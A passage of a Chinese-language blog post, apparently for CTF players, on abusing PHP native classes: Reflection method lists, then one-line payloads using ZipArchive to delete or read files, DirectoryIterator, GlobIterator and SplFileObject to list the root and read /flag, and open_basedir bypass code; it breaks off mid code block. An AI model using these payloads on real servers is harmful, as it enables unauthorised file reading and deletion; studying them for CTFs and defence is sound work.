</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionClass</span><span class=p>(</span><span class=s2>&#34;class?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>getTraitNames</span><span class=p>()</span> <span class=c1>// 获取类所使用 traits 名称的数组
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionClass</span><span class=p>(</span><span class=s2>&#34;class?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>getTraits</span><span class=p>()</span> <span class=c1>// 获取类所使用的 traits 
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionClass</span><span class=p>(</span><span class=s2>&#34;class?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>hasConstant</span><span class=p>(</span><span class=nx>string</span> <span class=nv>$name</span><span class=p>)</span> <span class=c1>// 类是否有指定的常量
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionClass</span><span class=p>(</span><span class=s2>&#34;class?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>hasMethod</span><span class=p>(</span><span class=nx>string</span> <span class=nv>$name</span><span class=p>)</span> <span class=c1>// 类是否有指定的方法
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionClass</span><span class=p>(</span><span class=s2>&#34;class?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>implementsInterface</span><span class=p>(</span><span class=nx>string</span> <span class=nv>$interface</span><span class=p>)</span> <span class=c1>// 类是否实现指定的接口
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionClass</span><span class=p>(</span><span class=s2>&#34;class?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>inNamespace</span><span class=p>()</span> <span class=c1>// 类是否在命名空间中
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionClass</span><span class=p>(</span><span class=s2>&#34;class?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>isAbstract</span><span class=p>()</span> <span class=c1>// 类是否是抽象类
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionClass</span><span class=p>(</span><span class=s2>&#34;class?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>isAnonymous</span><span class=p>()</span> <span class=c1>// 类是否是匿名类
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionClass</span><span class=p>(</span><span class=s2>&#34;class?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>isCloneable</span><span class=p>()</span> <span class=c1>// 类是否是可复制的
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionClass</span><span class=p>(</span><span class=s2>&#34;class?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>isFinal</span><span class=p>()</span> <span class=c1>// 类是否声明为 final
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionClass</span><span class=p>(</span><span class=s2>&#34;class?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>isInternal</span><span class=p>()</span> <span class=c1>// 类是否是内部的
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionClass</span><span class=p>(</span><span class=s2>&#34;class?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>isIterable</span><span class=p>()</span> <span class=c1>// 类是否是一个迭代类
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionClass</span><span class=p>(</span><span class=s2>&#34;class?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>isIterateable</span><span class=p>()</span> <span class=c1>// 类是否是可迭代的
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionClass</span><span class=p>(</span><span class=s2>&#34;class?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>isSubclassOf</span><span class=p>(</span><span class=nx>string</span> <span class=nv>$class</span><span class=p>)</span> <span class=c1>// 类是否是指定类的子类
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionClass</span><span class=p>(</span><span class=s2>&#34;class?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>isTrait</span><span class=p>()</span> <span class=c1>// 类是否是 trait
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionClass</span><span class=p>(</span><span class=s2>&#34;class?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>isUserDefined</span><span class=p>()</span> <span class=c1>// 类是否是用户定义的
</span></span></span></code></pre></td></tr></table></div></div><h4 id=reflectionfunctionabstract>ReflectionFunctionAbstract</h4><p>这个是<code>ReflectionFunction</code> 和 <code>ReflectionMethod</code> 的父类，所以想着看看有什么方法，但是没想到这个反射类基本方法都是差不多甚至是一模一样的</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=c1># 获取函数/方法的参数信息
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionFunctionAbstract</span><span class=p>(</span><span class=s2>&#34;function?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>getParameters</span><span class=p>();</span> <span class=c1>// 获取参数列表
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=c1># 获取函数/方法的返回类型
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionFunctionAbstract</span><span class=p>(</span><span class=s2>&#34;function?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>getReturnType</span><span class=p>();</span> <span class=c1>// 获取返回类型
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=c1># 获取函数/方法的开始和结束行号
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionFunctionAbstract</span><span class=p>(</span><span class=s2>&#34;function?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>getStartLine</span><span class=p>();</span> <span class=c1>// 获取开始行号
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionFunctionAbstract</span><span class=p>(</span><span class=s2>&#34;function?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>getEndLine</span><span class=p>();</span> <span class=c1>// 获取结束行号
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=c1># 获取函数/方法的文档注释
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionFunctionAbstract</span><span class=p>(</span><span class=s2>&#34;function?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>getDocComment</span><span class=p>();</span> <span class=c1>// 获取文档注释
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=c1># 获取函数/方法的静态变量
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionFunctionAbstract</span><span class=p>(</span><span class=s2>&#34;function?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>getStaticVariables</span><span class=p>();</span> <span class=c1>// 获取静态变量
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=c1># 调用函数/方法
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionFunctionAbstract</span><span class=p>(</span><span class=s2>&#34;function?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>invoke</span><span class=p>(</span><span class=nv>$arg1</span><span class=p>,</span> <span class=nv>$arg2</span><span class=p>);</span> <span class=c1>// 直接调用函数/方法
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionFunctionAbstract</span><span class=p>(</span><span class=s2>&#34;function?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>invokeArgs</span><span class=p>(</span><span class=k>array</span> <span class=nv>$args</span><span class=p>);</span> <span class=c1>// 使用数组调用函数/方法
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=c1># 判断函数/方法是否返回引用
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionFunctionAbstract</span><span class=p>(</span><span class=s2>&#34;function?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>returnsReference</span><span class=p>();</span> <span class=c1>// 是否返回引用
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=c1># 检查函数/方法是否是闭包
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionFunctionAbstract</span><span class=p>(</span><span class=s2>&#34;function?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>isClosure</span><span class=p>();</span> <span class=c1>// 是否为闭包
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=c1># 检查函数/方法是否为生成器
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionFunctionAbstract</span><span class=p>(</span><span class=s2>&#34;function?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>isGenerator</span><span class=p>();</span> <span class=c1>// 是否为生成器
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=c1># 检查函数/方法是否是内部函数/方法
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionFunctionAbstract</span><span class=p>(</span><span class=s2>&#34;function?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>isInternal</span><span class=p>();</span> <span class=c1>// 是否为内部函数
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=c1># 检查函数/方法是否为用户定义的
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionFunctionAbstract</span><span class=p>(</span><span class=s2>&#34;function?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>isUserDefined</span><span class=p>();</span> <span class=c1>// 是否为用户定义的
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=c1># 获取函数/方法名称
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionFunctionAbstract</span><span class=p>(</span><span class=s2>&#34;function?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>getName</span><span class=p>();</span> <span class=c1>// 获取函数/方法名称
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=c1># 导出函数/方法信息
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionFunctionAbstract</span><span class=p>(</span><span class=s2>&#34;function?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>export</span><span class=p>(</span><span class=s1>&#39;function?&#39;</span><span class=p>,</span> <span class=k>true</span><span class=p>);</span> <span class=c1>// 导出函数/方法信息
</span></span></span></code></pre></td></tr></table></div></div><h3 id=文件处理>文件处理</h3><h4 id=ziparchive>ZipArchive</h4><p>这个单独列出来是因为既可以目录又可以文件，直接给poc了</p><h5 id=删除文件>删除文件</h5><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$a</span><span class=o>=</span><span class=k>new</span> <span class=nx>ZipArchive</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>-&gt;</span><span class=na>open</span><span class=p>(</span><span class=s2>&#34;file&#34;</span><span class=p>,</span> <span class=nx>ZipArchive</span><span class=o>::</span><span class=na>OVERWRITE</span><span class=p>);</span> <span class=c1>// ZipArchive::CREATE也可以用8代替
</span></span></span></code></pre></td></tr></table></div></div><p>注意这里的<code>file</code>是填写<code>zip</code>文件路径</p><h5 id=读取文件>读取文件</h5><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$f</span> <span class=o>=</span> <span class=s2>&#34;flag&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$zip</span><span class=o>=</span><span class=k>new</span> <span class=nx>ZipArchive</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$zip</span><span class=o>-&gt;</span><span class=na>open</span><span class=p>(</span><span class=s2>&#34;a.zip&#34;</span><span class=p>,</span> <span class=nx>ZipArchive</span><span class=o>::</span><span class=na>CREATE</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$zip</span><span class=o>-&gt;</span><span class=na>addFile</span><span class=p>(</span><span class=nv>$f</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$zip</span><span class=o>-&gt;</span><span class=na>close</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$zip</span><span class=o>-&gt;</span><span class=na>open</span><span class=p>(</span><span class=s2>&#34;a.zip&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nv>$zip</span><span class=o>-&gt;</span><span class=na>getFromName</span><span class=p>(</span><span class=nv>$f</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$zip</span><span class=o>-&gt;</span><span class=na>close</span><span class=p>();</span>
</span></span></code></pre></td></tr></table></div></div><h5 id=有损写文件>有损写文件</h5><p>用处不大</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$f</span> <span class=o>=</span> <span class=s2>&#34;flag&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$zip</span><span class=o>=</span><span class=k>new</span> <span class=nx>ZipArchive</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$zip</span><span class=o>-&gt;</span><span class=na>open</span><span class=p>(</span><span class=s2>&#34;a.zip&#34;</span><span class=p>,</span> <span class=nx>ZipArchive</span><span class=o>::</span><span class=na>CREATE</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$zip</span><span class=o>-&gt;</span><span class=na>setArchiveComment</span><span class=p>(</span><span class=s2>&#34;&lt;?php phpinfo();?&gt;&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$zip</span><span class=o>-&gt;</span><span class=na>addFromString</span><span class=p>(</span><span class=s2>&#34;file&#34;</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$zip</span><span class=o>-&gt;</span><span class=na>close</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=c1>//include &#34;a.zip&#34;;
</span></span></span></code></pre></td></tr></table></div></div><h4 id=目录>目录</h4><h5 id=directoryiterator><strong>DirectoryIterator</strong></h5><p>利用版本<strong>PHP5, PHP7, PHP8</strong></p><p>我们可以利用这个类来遍历或者是使用<code>glob</code>,直接寻找想要的文件</p><p>查找<code>f</code>开头的文件</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$dir</span><span class=o>=</span><span class=k>new</span> <span class=nx>DirectoryIterator</span><span class=p>(</span><span class=s2>&#34;glob:///f*&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nv>$dir</span><span class=p>;</span>
</span></span></code></pre></td></tr></table></div></div><p>遍历根目录的文件名</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$dir</span><span class=o>=</span><span class=k>new</span> <span class=nx>DirectoryIterator</span><span class=p>(</span><span class=s2>&#34;/&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>foreach</span><span class=p>(</span><span class=nv>$dir</span> <span class=k>as</span> <span class=nv>$a</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=nv>$a</span><span class=o>.</span><span class=s1>&#39;&lt;br&gt;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>当然这仅仅只是Demo深入其中我们查询官方文档，可以看到其中也是有很多方法，但是我们注重看我们使用的这个</p><p><img src=/p/php-native-class-exploitation/QQ20240919-152139.png width=1065 height=502 srcset="/p/php-native-class-exploitation/QQ20240919-152139_hu_37e56c6888e69738.png 480w, /p/php-native-class-exploitation/QQ20240919-152139_hu_c04c499eb3455953.png 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=212 data-flex-basis=509px></p><p>也就是说其实我们是调用了其中的<code>__toString()</code>,所以正经的写法是这样子</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$dir</span><span class=o>=</span><span class=k>new</span> <span class=nx>DirectoryIterator</span><span class=p>(</span><span class=s2>&#34;/&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>foreach</span><span class=p>(</span><span class=nv>$dir</span> <span class=k>as</span> <span class=nv>$a</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=nv>$a</span><span class=o>-&gt;</span><span class=na>__toString</span><span class=p>()</span><span class=o>.</span><span class=s1>&#39;&lt;br&gt;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>但是我们不写的话由于<code>echo</code>和<code>var_dump</code>也会自动调用这个方法</p><p>payload</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$d=new DirectoryIterator(&#34;/&#34;);foreach($d as $a){echo $a.&#39;&lt;br&gt;&#39;;}
</span></span></code></pre></td></tr></table></div></div><h5 id=filesystemlterator><strong>Filesystemlterator</strong></h5><p>利用版本，<strong>PHP 5 >= 5.3.0, PHP 7, PHP 8</strong></p><p>这个类和<strong>DirectoryIterator</strong>是孪生兄弟，一样的不写了就</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$d=new FilesystemIterator(&#34;/&#34;);foreach($d as $a){echo $a.&#39;&lt;br&gt;&#39;;}
</span></span></code></pre></td></tr></table></div></div><h5 id=globiterator>GlobIterator</h5><p>继承于<strong>DirectoryIterator</strong>而且自带了<code>glob</code>,一测便知</p><p>利用版本，<strong>PHP 5 >= 5.3.0, PHP 7, PHP 8</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$dir</span><span class=o>=</span><span class=k>new</span> <span class=nx>GlobIterator</span><span class=p>(</span><span class=s2>&#34;/*&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>foreach</span><span class=p>(</span><span class=nv>$dir</span> <span class=k>as</span> <span class=nv>$a</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=nv>$a</span><span class=o>-&gt;</span><span class=na>__toString</span><span class=p>()</span><span class=o>.</span><span class=s1>&#39;&lt;br&gt;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>遍历根目录的文件</p><p>payload</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$d=new GlobIterator(&#34;/*&#34;);foreach($d as $a){echo $a.&#39;&lt;br&gt;&#39;;}
</span></span></code></pre></td></tr></table></div></div><h4 id=文件内容>文件内容</h4><h5 id=splfileobject>SplFileObject</h5><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nv>$content</span><span class=o>=</span><span class=k>new</span> <span class=nx>SplFileObject</span><span class=p>(</span><span class=s1>&#39;/flag&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>foreach</span><span class=p>(</span><span class=nv>$content</span> <span class=k>as</span> <span class=nv>$content</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=nv>$content</span><span class=o>.</span><span class=s2>&#34;&lt;br&gt;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>相当于是<code>file_get_contents()</code>,但是这个是类同样是使用<code>__toString</code>方法进行读取的</p><h4 id=绕过open_basedir>绕过open_basedir</h4><p><code>open_basedir</code> 是 PHP 中的一项安全配置，用于限制脚本访问的文件系统路径。它可以防止 PHP 脚本访问不允许的目录，从而增强服务器的安全性。但是其实是有方法可以绕过进行任意文件目录\文件读取</p><h5 id=directoryiteratorglob>DirectoryIterator+glob</h5><p>然后我们写个<code>demo</code>(P牛的代码)</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>printf</span><span class=p>(</span><span class=s1>&#39;&lt;b&gt;open_basedir : %s &lt;/b&gt;&lt;br /&gt;&#39;</span><span class=p>,</span> <span class=nx>ini_get</span><span class=p>(</span><span class=s1>&#39;open_basedir&#39;</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=nv>$file_list</span> <span class=o>=</span> <span class=k>array</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=c1>// normal files
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$it</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>DirectoryIterator</span><span class=p>(</span><span class=s2>&#34;glob:///*&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>foreach</span><span class=p>(</span><span class=nv>$it</span> <span class=k>as</span> <span class=nv>$f</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$file_list</span><span class=p>[]</span> <span class=o>=</span> <span class=nv>$f</span><span class=o>-&gt;</span><span class=na>__toString</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=c1>// special files (starting with a dot(.))
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$it</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>DirectoryIterator</span><span class=p>(</span><span class=s2>&#34;glob:///.*&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>foreach</span><span class=p>(</span><span class=nv>$it</span> <span class=k>as</span> <span class=nv>$f</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$file_list</span><span class=p>[]</span> <span class=o>=</span> <span class=nv>$f</span><span class=o>-&gt;</span><span class=na>__toString</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nx>sort</span><span class=p>(</span><span class=nv>$file_list</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>foreach</span><span class=p>(</span><span class=nv>$file_list</span> <span class=k>as</span> <span class=nv>$f</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=s2>&#34;</span><span class=si>{</span><span class=nv>$f</span><span class=si>}</span><span class=s2>&lt;br/&gt;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>但是这个好像对版本有要求，我现在如果在ini中设置了<code>open_basedir</code>是不能通了(7.3.4)</p><h5 id=realpath>realpath</h5><blockquote><p>Realpath函数是php中将一个路径规范化成为绝对路径的方法，它可以去掉多余的../或./等跳转字符，能将相对路径转换成绝对路径。</p><p>在开启了open_basedir以后，这个函数有个特点：当我们传入的路径是一个不存在的文件（目录）时，它将返回false；当我们传入一个不在open_basedir里的文件（目录）时，他将抛出错误（File is not within the allowed path(s)）。</p></blockquote><p>根据抛出的错误做一个分流就可以暴力猜解文件</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
